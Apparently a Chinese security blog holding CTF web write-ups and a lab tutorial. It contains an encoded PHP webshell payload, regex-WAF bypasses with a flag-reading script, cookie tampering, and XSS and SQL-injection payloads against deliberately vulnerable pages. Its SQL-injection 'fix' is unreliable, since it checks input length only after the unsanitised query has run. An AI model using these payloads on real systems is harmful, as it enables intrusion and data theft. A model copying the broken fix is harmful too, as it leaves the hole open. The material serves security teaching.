<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207214024481.png" srcset="/img/loading.gif" alt="image-20210207214024481"></p>
<p>构造shell用蚁剑连接</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
error_reporting(<span class="hljs-number">0</span>);

$a=<span class="hljs-string">'assert'</span>;
$b=urlencode(~$a);
<span class="hljs-keyword">echo</span> $b;

<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
$c=<span class="hljs-string">'(eval($_POST["test"]))'</span>;
$d=urlencode(~$c);
<span class="hljs-keyword">echo</span> $d;
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>

<div class="hljs"><pre><code class="hljs llvm">?code=(~<span class="hljs-symbol">%9</span>E<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%8</span>D<span class="hljs-symbol">%8</span>B)(~<span class="hljs-symbol">%D7</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%89</span><span class="hljs-symbol">%9</span>E<span class="hljs-symbol">%93</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%DB</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%B0</span><span class="hljs-symbol">%AC</span><span class="hljs-symbol">%AB</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%DD</span><span class="hljs-symbol">%8</span>B<span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%8</span>B<span class="hljs-symbol">%DD</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%D6</span><span class="hljs-symbol">%D6</span>)<span class="hljs-comment">;</span></code></pre></div>

<p>使用蚁剑连接后发现了flag文件和readflag</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207224214579.png" srcset="/img/loading.gif" alt="image-20210207224214579"></p>
<p>但是flag文件不可以直接读取(因为命令执行函数被禁用)，需要使用readflag读取其中的内容</p>
<p>可以使用蚁剑自带的插件绕过disable_function，之后运行readflag获取flag文件内容</p>
<p>但是再蚁剑安装插件时，插件一直加载不出来需要挂代理之后才能加载出来</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207224506114.png" srcset="/img/loading.gif" alt="image-20210207224506114"></p>
<p>其中端口是你所使用的梯子向外转发的端口</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207224551259.png" srcset="/img/loading.gif" alt="image-20210207224551259"></p>
<p>安装  绕过disable_function 这个插件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207224655103.png" srcset="/img/loading.gif" alt="image-20210207224655103"></p>
<p>插件安装好后就是无脑操作了。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207224717078.png" srcset="/img/loading.gif" alt="image-20210207224717078"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207224748880.png" srcset="/img/loading.gif" alt="image-20210207224748880"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207224206612.png" srcset="/img/loading.gif" alt="image-20210207224206612"></p>
<h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>要求输入json格式的命令</p>
<p>最简单的形式，可以用下面这样的 JSON 表示 “名称 / 值对” ：{ “firstName”: “Brett” }</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210208220310475.png" srcset="/img/loading.gif" alt="image-20210208220310475"></p>
<p>输入</p>
<div class="hljs"><pre><code class="hljs json">&#123;<span class="hljs-attr">"cmd"</span>:<span class="hljs-string">"ls"</span>&#125;</code></pre></div>

<p>会显示出index.php，没有其他的文件了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210208221222172.png" srcset="/img/loading.gif" alt="image-20210208221222172"></p>
<p>尝试读取该文件，但是出现了hacking，说明存在waf，cat命令被过滤</p>
<p>尝试了less，more，发现都被过滤</p>
<p>网上找到了源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

putenv(<span class="hljs-string">'PATH=/home/rceservice/jail'</span>);

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'cmd'</span>])) &#123;
  $json = $_REQUEST[<span class="hljs-string">'cmd'</span>];

  <span class="hljs-keyword">if</span> (!is_string($json)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;
  &#125; <span class="hljs-keyword">elseif</span> (preg_match(<span class="hljs-string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;
  &#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Attempting to run command:&lt;br/&gt;'</span>;
    $cmd = json_decode($json, <span class="hljs-keyword">true</span>)[<span class="hljs-string">'cmd'</span>];
    <span class="hljs-keyword">if</span> ($cmd !== <span class="hljs-keyword">NULL</span>) &#123;
      system($cmd);
    &#125; <span class="hljs-keyword">else</span> &#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid input'</span>;
    &#125;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br/&gt;&lt;br/&gt;'</span>;
  &#125;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>可以看到正则表达式打开头和结尾存在<code>^</code>,<code>$</code>，说明是单行匹配，可以利用换行符绕过过滤</p>
<p>代码的第一句<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，程序改变了环境变量，只能用绝对路径执行命令，而我们使用的命令都存在<code>/bin</code>中</p>
<h2 id="多行绕过解题"><a href="#多行绕过解题" class="headerlink" title="多行绕过解题"></a>多行绕过解题</h2><p>payload：</p>
<div class="hljs"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-string">"cmd"</span>:<span class="hljs-string">"ls /home/rceservice"</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A&#125;

&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-string">"cmd"</span>: <span class="hljs-string">"/bin/cat /home/rceservice/flag"</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A&#125;</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210208222252682.png" srcset="/img/loading.gif" alt="image-20210208222252682"></p>
<h2 id="利用PCRE回溯来绕过-preg-match"><a href="#利用PCRE回溯来绕过-preg-match" class="headerlink" title="利用PCRE回溯来绕过 preg_match"></a>利用PCRE回溯来绕过 preg_match</h2><p>什么是PCRE <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">点这里</a></p>
<p>脚本如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
payload = <span class="hljs-string">'&#123;"cmd":"/bin/cat /home/rceservice/flag ","nayi":"'</span> + <span class="hljs-string">"a"</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">'"&#125;'</span> <span class="hljs-comment">##超过一百万，这里写一千万不会出结果。</span>

res = requests.post(<span class="hljs-string">"http://2526ca08-39b8-48c4-8385-e8c5d4b5dfd7.node3.buuoj.cn/"</span>, data=&#123;<span class="hljs-string">"cmd"</span>:payload&#125;)
<span class="hljs-comment">#需要使用POST方式，因为get不能提交这么大的数据</span>
print(res.text)</code></pre></div>



<h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><p>进入页面提示了设置cookie</p>
<p>构造cookie</p>
<div class="hljs"><pre><code class="hljs routeros">Cookie: <span class="hljs-attribute">monster</span>=admin</code></pre></div>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210209143425753.png" srcset="/img/loading.gif" alt="image-20210209143425753"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210209143332709.png" srcset="/img/loading.gif" alt="image-20210209143332709"></p>
<p>重放后在相应包中看到第二个提示，设置<code>username=</code></p>
<p>再次构造cookie</p>
<div class="hljs"><pre><code class="hljs pgsql">Cookie: monster=<span class="hljs-keyword">admin</span>;username=<span class="hljs-keyword">admin</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210209143648505.png" srcset="/img/loading.gif" alt="image-20210209143648505"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>xss和sql注入简单环境的搭建</title>
    <url>/2020/11/15/xss-sql/</url>
    <content><![CDATA[<h1 id="xss和sql注入简单环境的搭建"><a href="#xss和sql注入简单环境的搭建" class="headerlink" title="xss和sql注入简单环境的搭建"></a>xss和sql注入简单环境的搭建</h1><p>以下环境都是基于PHP study搭建的，版本为 php 5.5.38+Apache</p>
<a id="more"></a>

<p>参考了dvwa的漏洞源码与攻击方式。</p>
<h2 id="xss漏洞的搭建"><a href="#xss漏洞的搭建" class="headerlink" title="xss漏洞的搭建"></a>xss漏洞的搭建</h2><h3 id="1-网页源码"><a href="#1-网页源码" class="headerlink" title="1.网页源码"></a>1.网页源码</h3><div class="hljs"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;
		&lt;title&gt;xss&lt;&#x2F;title&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;center&gt;
			
			&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;
				&lt;h6&gt;please input your name!&lt;&#x2F;h6&gt;
				&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt;
				&lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;submit&quot; &#x2F;&gt;
			&lt;&#x2F;form&gt;
			
	
&lt;?php
  
function SafeFilter (&amp;$arr) 
&#123;
   $ra&#x3D;Array(&#39;&#x2F;([\x00-\x08,\x0b-\x0c,\x0e-\x19])&#x2F;&#39;,&#39;&#x2F;script&#x2F;&#39;,&#39;&#x2F;javascript&#x2F;&#39;,&#39;&#x2F;vbscript&#x2F;&#39;,&#39;&#x2F;expression&#x2F;&#39;,&#39;&#x2F;applet&#x2F;&#39;
   ,&#39;&#x2F;meta&#x2F;&#39;,&#39;&#x2F;xml&#x2F;&#39;,&#39;&#x2F;blink&#x2F;&#39;,&#39;&#x2F;link&#x2F;&#39;,&#39;&#x2F;style&#x2F;&#39;,&#39;&#x2F;embed&#x2F;&#39;,&#39;&#x2F;object&#x2F;&#39;,&#39;&#x2F;frame&#x2F;&#39;,&#39;&#x2F;layer&#x2F;&#39;,&#39;&#x2F;title&#x2F;&#39;,&#39;&#x2F;bgsound&#x2F;&#39;
   ,&#39;&#x2F;base&#x2F;&#39;,&#39;&#x2F;onload&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;,&#39;&#x2F;onchange&#x2F;&#39;,&#39;&#x2F;onsubmit&#x2F;&#39;,&#39;&#x2F;onreset&#x2F;&#39;,&#39;&#x2F;onselect&#x2F;&#39;,&#39;&#x2F;onblur&#x2F;&#39;,&#39;&#x2F;onfocus&#x2F;&#39;,
   &#39;&#x2F;onabort&#x2F;&#39;,&#39;&#x2F;onkeydown&#x2F;&#39;,&#39;&#x2F;onkeypress&#x2F;&#39;,&#39;&#x2F;onkeyup&#x2F;&#39;,&#39;&#x2F;onclick&#x2F;&#39;,&#39;&#x2F;ondblclick&#x2F;&#39;,&#39;&#x2F;onmousedown&#x2F;&#39;,&#39;&#x2F;onmousemove&#x2F;&#39;
   ,&#39;&#x2F;onmouseout&#x2F;&#39;,&#39;&#x2F;onmouseover&#x2F;&#39;,&#39;&#x2F;onmouseup&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;);
     
   if (is_array($arr))
   &#123;
     foreach ($arr as $key &#x3D;&gt; $value) 
     &#123;
        if (!is_array($value))
        &#123;
          if (!get_magic_quotes_gpc())  &#x2F;&#x2F;不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。
          &#123;
             $value  &#x3D; addslashes($value); &#x2F;&#x2F;给单引号（&#39;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义
          &#125;
          $value       &#x3D; preg_replace($ra,&#39;&#39;,$value);     &#x2F;&#x2F;删除非打印字符，粗暴式过滤xss可疑字符串
          $arr[$key]     &#x3D; htmlentities(strip_tags($value)); &#x2F;&#x2F;去除 HTML 和 PHP 标记并转换为 HTML 实体
        &#125;
        else
        &#123;
          SafeFilter($arr[$key]);
        &#125;
     &#125;
   &#125;
&#125;
&#x2F;&#x2F;php防注入和XSS攻击通用过滤
$_POST    &amp;&amp; SafeFilter($_POST);

			if (isset($_POST[&#39;username&#39;]))
			&#123;
				$s&#x3D;$_POST[&#39;username&#39;];
				
				echo $s;

			&#125;
			
?&gt;
	&lt;&#x2F;center&gt;
		
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;</code></pre></div>

<p>网页源码十分简单，就是用户输入所要查询的username，之后将其输入的内容打印出来。</p>
<p>起初并没有对用户的输入进行处理，直接执行了<code>echo</code>，造成了xss漏洞的出现。</p>
<h3 id="2-攻击效果"><a href="#2-攻击效果" class="headerlink" title="2.攻击效果"></a>2.攻击效果</h3><p>在输入栏中输入以下</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">"xss"</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xsss/)</span>&gt;</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/12/4f6rKtjU8sg7IoT.png" srcset="/img/loading.gif" alt="xss.png"></p>
<p><img src="https://i.loli.net/2020/11/12/EAnVq5yv4ZWJo8z.png" srcset="/img/loading.gif" alt="xss1.png"></p>
<h3 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><p>修复漏洞只需要对用户的输入内容进行检测和过滤，并将一些可能造成攻击的特殊字符进行转义，让其不起到原本的作用。</p>
<p>过滤函数如下</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SafeFilter</span> <span class="hljs-params">(&amp;$arr)</span> </span>
<span class="hljs-function"></span>&#123;
   $ra=<span class="hljs-keyword">Array</span>(<span class="hljs-string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>,<span class="hljs-string">'/script/'</span>,<span class="hljs-string">'/javascript/'</span>,<span class="hljs-string">'/vbscript/'</span>,<span class="hljs-string">'/expression/'</span>,<span class="hljs-string">'/applet/'</span>
   ,<span class="hljs-string">'/meta/'</span>,<span class="hljs-string">'/xml/'</span>,<span class="hljs-string">'/blink/'</span>,<span class="hljs-string">'/link/'</span>,<span class="hljs-string">'/style/'</span>,<span class="hljs-string">'/embed/'</span>,<span class="hljs-string">'/object/'</span>,<span class="hljs-string">'/frame/'</span>,<span class="hljs-string">'/layer/'</span>,<span class="hljs-string">'/title/'</span>,<span class="hljs-string">'/bgsound/'</span>
   ,<span class="hljs-string">'/base/'</span>,<span class="hljs-string">'/onload/'</span>,<span class="hljs-string">'/onunload/'</span>,<span class="hljs-string">'/onchange/'</span>,<span class="hljs-string">'/onsubmit/'</span>,<span class="hljs-string">'/onreset/'</span>,<span class="hljs-string">'/onselect/'</span>,<span class="hljs-string">'/onblur/'</span>,<span class="hljs-string">'/onfocus/'</span>,
   <span class="hljs-string">'/onabort/'</span>,<span class="hljs-string">'/onkeydown/'</span>,<span class="hljs-string">'/onkeypress/'</span>,<span class="hljs-string">'/onkeyup/'</span>,<span class="hljs-string">'/onclick/'</span>,<span class="hljs-string">'/ondblclick/'</span>,<span class="hljs-string">'/onmousedown/'</span>,<span class="hljs-string">'/onmousemove/'</span>
   ,<span class="hljs-string">'/onmouseout/'</span>,<span class="hljs-string">'/onmouseover/'</span>,<span class="hljs-string">'/onmouseup/'</span>,<span class="hljs-string">'/onunload/'</span>);
     
   <span class="hljs-keyword">if</span> (is_array($arr))
   &#123;
     <span class="hljs-keyword">foreach</span> ($arr <span class="hljs-keyword">as</span> $key =&gt; $value) <span class="hljs-comment">//循环语句，挨个检测</span>
     &#123;
        <span class="hljs-keyword">if</span> (!is_array($value))
        &#123;
          <span class="hljs-keyword">if</span> (!get_magic_quotes_gpc()) 
          &#123;
             $value  = addslashes($value); <span class="hljs-comment">//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义</span>
          &#125;
          $value       = preg_replace($ra,<span class="hljs-string">''</span>,$value);     <span class="hljs-comment">//删除非打印字符</span>
          $arr[$key]     = htmlentities(strip_tags($value)); <span class="hljs-comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span>
        &#125;
        <span class="hljs-keyword">else</span>
        &#123;
          SafeFilter($arr[$key]);
        &#125;
     &#125;
   &#125;
&#125;</code></pre></div>

<p><strong>各个函数功能如下：</strong></p>
<p><strong>magic_quotes_gpc</strong>函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误</p>
<p>在magic_quotes_gpc=On的情况下，如果输入的数据有</p>
<p>单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。</p>
<p><strong>addslashes函数</strong></p>
<p><img src="https://i.loli.net/2020/11/12/W7m2yOvok3g6ZXA.png" srcset="/img/loading.gif" alt="addslashes.png"></p>
<p><strong>htmlentities()</strong> 函数把字符转换为 HTML 实体。</p>
<h2 id="sql注入环境搭建与攻击"><a href="#sql注入环境搭建与攻击" class="headerlink" title="sql注入环境搭建与攻击"></a>sql注入环境搭建与攻击</h2><p>网页源码，最常见的登录页面，其中没有对用户名和密码进行过滤，就将其带入sql语句中查询造成了sql注入的出现。</p>
<p>login.php源码</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;

&lt;html &gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;
        &lt;title&gt;Sqli&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;

&lt;body&gt;

&lt;div class&#x3D;&quot;limiter&quot;&gt;
    &lt;div class&#x3D;&quot;container-login100&quot;&gt;
        &lt;div class&#x3D;&quot;wrap-login100 p-b-160 p-t-50&quot;&gt;
            &lt;form class&#x3D;&quot;login100-form validate-form&quot; action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt;
					&lt;span class&#x3D;&quot;login100-form-title p-b-43&quot;&gt;
						Account Login
					&lt;&#x2F;span&gt;

                &lt;div class&#x3D;&quot;wrap-input100 rs1 validate-input&quot; data-validate&#x3D;&quot;Username is required&quot;&gt;
                    &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;
                    &lt;span class&#x3D;&quot;label-input100&quot;&gt;Username&lt;&#x2F;span&gt;
                &lt;&#x2F;div&gt;


                &lt;div class&#x3D;&quot;wrap-input100 rs2 validate-input&quot; data-validate&#x3D;&quot;Password is required&quot;&gt;
                    &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;
                    &lt;span class&#x3D;&quot;label-input100&quot;&gt;Password&lt;&#x2F;span&gt;
                &lt;&#x2F;div&gt;

                &lt;div class&#x3D;&quot;container-login100-form-btn&quot;&gt;
                    &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;login100-form-btn&quot;&gt;
                        Sign in
                    &lt;&#x2F;button&gt;
                &lt;&#x2F;div&gt;

            &lt;&#x2F;form&gt;
        &lt;&#x2F;div&gt;

    &lt;&#x2F;a&gt;

&lt;&#x2F;div&gt;

&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;</code></pre></div>

<p>check.php源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$pwd=$_POST[<span class="hljs-string">'password'</span>];
$uname=$_POST[<span class="hljs-string">'username'</span>];

$mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'test'</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;
    printf(<span class="hljs-string">"fail:%s&lt;br&gt;"</span>,mysqli_connect_error());
    <span class="hljs-keyword">exit</span>();
&#125;
$result = $mysqli-&gt;query(<span class="hljs-string">"select * from users where username='$uname' and password='$pwd'"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;TABLE border=1,width=400&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;"</span>;

<span class="hljs-keyword">if</span>($row=mysqli_fetch_row($result))
&#123;
	printf (<span class="hljs-string">"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</span>,$row[<span class="hljs-number">1</span>],$row[<span class="hljs-number">2</span>]);
       	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"login success"</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error"</span>;
&#125;
<span class="hljs-comment">// echo "&lt;/TABLE&gt;";</span>
<span class="hljs-comment">// echo "&lt;/div&gt;";</span>
$mysqli-&gt;close();
$result-&gt;close();
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>逻辑很简单，在login.php页面提交用户名和密码，将username和password发送到check.php页面连接数据库检查用户是否合法，用户名和密码都正确则，打印出用户名和密码。</p>
<p>在数据库建立了一张users和flag表，便于注入。</p>
<p>表中的内容如下</p>
<p><img src="https://i.loli.net/2020/11/13/YACXPd9oOZvhfxN.png" srcset="/img/loading.gif" alt="sql1.png"></p>
<p><img src="https://i.loli.net/2020/11/13/oTqy8WhX6CGwS9A.png" srcset="/img/loading.gif" alt="sql2.png"></p>
<p><img src="https://i.loli.net/2020/11/13/ghDmGtqeQLCyNZz.png" srcset="/img/loading.gif" alt="sql3.png"></p>
<h3 id="1-漏洞利用"><a href="#1-漏洞利用" class="headerlink" title="1.漏洞利用"></a>1.漏洞利用</h3><p>直接使用万能密码登陆</p>
<div class="hljs"><pre><code class="hljs makefile"><span class="hljs-section">username:1' or 1=1 #</span>
<span class="hljs-section">username:111</span></code></pre></div>

<p>结果打印出了第一个用户的用户名和密码</p>
<p><img src="https://i.loli.net/2020/11/13/omqb2AzDvC4w69g.png" srcset="/img/loading.gif" alt="sql4.png"></p>
<p>这个结果也说名了是字符型注入，接下来利用改注入点获取flag</p>
<h4 id="判断表有几列"><a href="#判断表有几列" class="headerlink" title="判断表有几列"></a>判断表有几列</h4><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span>
页面显示正常，而改为<span class="hljs-number">4</span>的时候网页出现报错，说明了只有三列
<span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span></code></pre></div>



<h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><div class="hljs"><pre><code class="hljs gauss">' <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span></code></pre></div>



<p>说明有两个显示位，选择其中一个位置进行注入即可。</p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><div class="hljs"><pre><code class="hljs sql">' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/13/btQg6vFRZipUd1n.png" srcset="/img/loading.gif" alt="sql6.png"></p>
<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><div class="hljs"><pre><code class="hljs sql">' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(COLUMN_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME=<span class="hljs-string">'flag'</span><span class="hljs-comment">#</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/13/KlwToCWSGiau4FM.png" srcset="/img/loading.gif" alt="sql7.png"></p>
<p>（fl4g是dvwa实验中建立没有删除，所以也显示出来了）</p>
<h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><div class="hljs"><pre><code class="hljs sql">' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(flag),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> flag<span class="hljs-comment">#</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/13/wIQmSv7oCeXVWiR.png" srcset="/img/loading.gif" alt="sqlflag.png"></p>
<h3 id="2-漏洞防御"><a href="#2-漏洞防御" class="headerlink" title="2.漏洞防御"></a>2.漏洞防御</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a><strong>方法一：</strong></h4><p>最简单的方法对用户名和密码的长度限制，一般用户名的长度不超过十五个字符，而密码的长度一般不超过16个字符长度，所以对用户输入限制长度是最有效的方法之一。因为一般的注入语句都是超过十六个字符的，想要在十六个字符之内构造出有效的注入语句是一件很难的事情。</p>
<p>代码实现</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$pwd=$_POST[<span class="hljs-string">'password'</span>];
$uname=$_POST[<span class="hljs-string">'username'</span>];
$mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'test'</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;
    printf(<span class="hljs-string">"fail:%s&lt;br&gt;"</span>,mysqli_connect_error());
    <span class="hljs-keyword">exit</span>();
&#125;
$result = $mysqli-&gt;query(<span class="hljs-string">"select * from users where username='$uname' and password='$pwd'"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;TABLE border=1,width=400&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;"</span>;

<span class="hljs-keyword">if</span>(strlen($pwd)&gt;=<span class="hljs-number">16</span>||strlen($uname)&gt;=<span class="hljs-number">15</span>)
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"It is too long."</span>;
&#125;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($row=mysqli_fetch_row($result))
&#123;
	printf (<span class="hljs-string">"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</span>,$row[<span class="hljs-number">1</span>],$row[<span class="hljs-number">2</span>]);
       	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"login success."</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error."</span>;
&#125;
